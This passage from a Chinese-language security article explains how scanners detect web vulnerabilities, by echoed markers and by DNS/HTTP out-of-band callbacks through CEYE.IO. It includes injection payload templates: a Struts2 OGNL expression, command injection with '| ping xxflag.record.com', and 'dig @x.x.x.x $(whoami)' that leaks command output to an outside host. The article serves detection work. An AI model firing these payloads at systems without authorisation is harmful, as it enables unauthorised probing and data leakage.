### iv. Remote Code/Command Execution（回显）
远程代码/命令执行都是执行，对该类漏洞要进行无害扫描，通常的做法是打印随机字符串，或者运行一下特征函数，然后检查页面返回是否存在特征标识来确认漏洞与否。
```
payload: "... echo md5(rand_num); ..."
condition: (content_flag) in response.content
```
当然了，要执行什么样的特征命令这还需要结合特定的漏洞环境来决定。
### v. SSTI/ELI（回显）
模板注入和表达式注入相对于传统的 SQLi 和 XSS 来说，应该算得上是在开框架化、整体化的过程中产生的问题，当模板内容可控时各种传统的 Web 漏洞也就出现了，XSS、命令执行都能够通过模板注入或着表达式注入做到。曾经风靡一时的 Struts2 漏洞我觉得都能归到此类漏洞中。通常检测只需构造相应模板语言对应的表达式即可，存在注入表达式会得以执行并返回内容：
```
payload1: "... param=%(rand_num1 + rand_num2) ..."
condition1: (rand_num1 + rand_num2) in response.content
payload2: "... param=%(rand_num1 * rand_num2) ..."
condition2: (rand_num1 * rand_num2) in response.content
payload3: "... #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(rand_str1+rand_str2),#response.flush(),#response.close() .."
condition3: (rand_str1+ rand_str2) in response.content
```
### vi. 文件哈希
有时候漏洞只与单个文件有关，例如 Flash、JavaScript 等文件造成的漏洞，这个时候就可以利用文件哈希来直接判断是否存在漏洞。扫描检测时，首先需要给定路径下载对应的文件然后计算哈希与统计的具有漏洞的所有文件哈希进行比对，匹配成功则说明漏洞存在：
```
payload: "http://vuln.com/vuln_swf_file.swf"
condition: hash(vul_swf_file.swf) == hash_recorded
```
以上就是针对 Web 漏洞检测方法中的 “直接判断” 进行了示例说明，因 Web 漏洞类型繁多且环境复杂，这里不可能对其进行一一举例，所举的例子都是为了更好地说明 “直接判断” 这种检测方法。:)
2. 间接判断
在很久很久之前，我遇到上述这些无回显漏洞环境时是一脸茫然的，一开始懂得了用回连进行判断，后来有了 python -m SimpleHTTPServer 作为简单实时的 HTTP Server 作为回连监控，再后来有了《Data Retrieval over DNS in SQL Injection Attacks》这篇 Paper，虽然文章说的技术点是通过 DNS 查询来获取 SQL 盲注的数据，但是 "Data Retrieval over DNS" 这种技术已经可以应用到大多数无法回显的漏洞上了，进而出现了一些公开的平台供安全研究爱好者们使用，如：乌云的 cloudeye 和 Bugscan 的 DNSLog，当然还有我重写的 CEYE.IO 平台（可以记录dns解析、apache访问log）。
"Data Retrieval over DNS" 技术原理其实很简单，首先需要有一个可以配置的域名，比如：test.com，然后通过代理商设置域名 test.com 的 nameserver 为自己的服务器 ceye.io，然后在服务器 ceye.io 上配置好 DNS Server，这样以来所有 test.com 及其子域名的查询都会到 服务器 ceye.io 上，这时就能够实时地监控域名查询请求了。
就算机器不能连外网，只要可以解析dns（配置了内网 local dns），就可以通过dns查询递归出命令执行的回显！说了那么多，还是不知道怎么用么？那就直接看示例吧（所以后端平台都用 CEYE.IO 作为例子）。
### i. XSS（无回显）
XSS 盲打在安全测试的时候是比较常用的，“看到框就想 X” 也是每位 XSSer 的信仰：
```
payload: "... > ..."
condition: {http://record.com/?blindssrf LOG} in HTTP requests LOGs
```
### iv. RCE（无回显）命令执行/命令注入
这个得好好说一下，我相信很多同学都懂得在命令执行无法回显的时候借用类似 python -m SimpleHTTPServer 这样的环境，采用回连的检测机制来实时监控访问日志。&#42;nix 系统环境下一般是使用 curl 命令或者wget 命令，而 windows 系统环境就没有这么方便的命令去直接访问一个链接，我之前常用的是 ftp 命令和 PowerShell 中的文件下载来访问日志服务器。现在，有了一个比较通用的做法同时兼顾 *nix 和 windows 平台，那就是 ping 命令，当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。
```
payload: "... | ping xxflag.record.com ..."
condition: {xxflag.record.com LOG} in DNS queries LOGs
```
![vul11](../pictures/vul11.png)
通过这几个 "间接判断" 的示例，相信大家也大概了解了在漏洞无回显的情况下如何进行扫描和检测了。更多的无回显 Payloads 可以通过 http://ceye.io/payloads 进行查看。也可以直接 dig @x.x.x.x  $(whoami) 这样如果在 dns解析服务器上有收到请求，则表示命令已经执行了。
## 0x03 应急实战举例
原理和例子说了这么多，也该上上实际的扫描检测案例了。
### Java 反序列化（通用性举例，ftp/ping）
首先说说 15 年底爆发的 Java 反序列化漏洞吧，这个漏洞应该算得上是 15 年 Web 漏洞之最了。记得当时应急进行扫描的时候，WebLogic 回显 PoC 并没有搞定，对其进行扫描检测的时候使用了回连的方式进行判断，又因为待测目标包含 *nix 和 windows 环境，所以是写了两个不同的 Payloads 对不同的系统环境进行检测，当时扫描代码的 Payloads 生成部分为：
![vul12](../pictures/vul12.png)
### i. *nix
当时真实的日志内容：
![vul13](../pictures/vul13.png)
可以看到我在构造 Payload 的时候通过链接参数来唯一识别每一次测试的 IP 地址和端口，这样在检查访问日志的时候就能确定该条记录是来自于哪一个测试目标（因为入口 IP 和出口 IP 可能不一致），同时在进行批量扫描的时候也能方便进行目标确认和日志处理。
### ii. windows
![vul14](../pictures/vul14.png)
当时真实的日志内容：
![vul15](../pictures/vul15.png)
因为 windows 上的 ftp 命令无法带类似参数一样的标志，所以通过观察 FTP Server 连接日志上不是很好确认当时测试的目标，因为入口 IP 和出口 IP 有时不一致。
上面的这些 PoC 和日志截图都是去年在应急时真实留下来的，回想当时再结合目前的一些知识，发现使用通用的 Payloadping xxxxx.record.com 并使用 "Data Retrieval over DNS" 技术来收集信息日志能够更为通用方便地进行检测和扫描。所以，最近更换了一下 Payload 结合 CEYE.IO 平台又对 WebLogic 反序列化漏洞的影响情况又进行了一次摸底：
![vul16](../pictures/vul16.png)
这里添加一个随机字符串作为一个子域名的一部分是为了防止多次检测时本地 DNS 缓存引起的问题（系统一般会缓存 DNS 记录，同一个域名第一次通过网络解析得到地址后，第二次通常会直接使用本地缓存而不会再去发起查询请求）。
相应平台的记录为（数量略多）：
![vul17](../pictures/vul17.png)
## Reference
[漏洞检测的那些事儿](http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/)